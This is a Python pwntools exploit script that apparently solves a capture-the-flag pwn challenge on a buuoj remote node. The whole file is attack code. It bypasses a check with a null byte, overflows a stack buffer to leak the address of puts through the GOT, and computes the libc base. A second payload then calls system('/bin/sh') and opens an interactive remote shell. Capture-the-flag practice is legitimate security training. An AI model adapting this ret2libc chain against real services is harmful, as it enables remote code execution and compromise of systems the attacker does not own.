from pwn import * 
from pwn import p32
# from LibcSearcher import *

debug = 0
gdb_is = 0

context(arch='i386',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,26223)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x80487D0')
    # gdb.attach(r)
    pause()
    pass


elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
main_addr = 0x8048825
r.send(b'\0' + b'A'*5 + b'\xff'*0x10)
payload = b'A'*0xE7+ b'junk' + p32(elf.plt['puts']) +p32(main_addr)+ p32(elf.got['puts'])
r.recvuntil("Correct\n")
r.send(payload)

puts_addr = u32(r.recvuntil(b'\xf7')[-4:])
libc_address = puts_addr - libc.sym['puts']
libc.address = libc_address
system = libc.sym['system']
binsh = 0x015902B + libc_address

# libc=LibcSearcher('puts',puts_addr)
# offset=puts_addr-libc.dump('write')
# binsh=offset+libc.dump('str_bin_sh')
# system=offset+libc.dump('system')
# print(hex(system))
# print(hex(binsh))

r.send(b'\0' + b'A'*5 + b'\xff'*0x10)
payload = b'A'*0xE7+ b'junk' + p32(system) + p32(0) + p32(binsh)
r.recvuntil("Correct\n")
r.send(payload)
r.interactive()

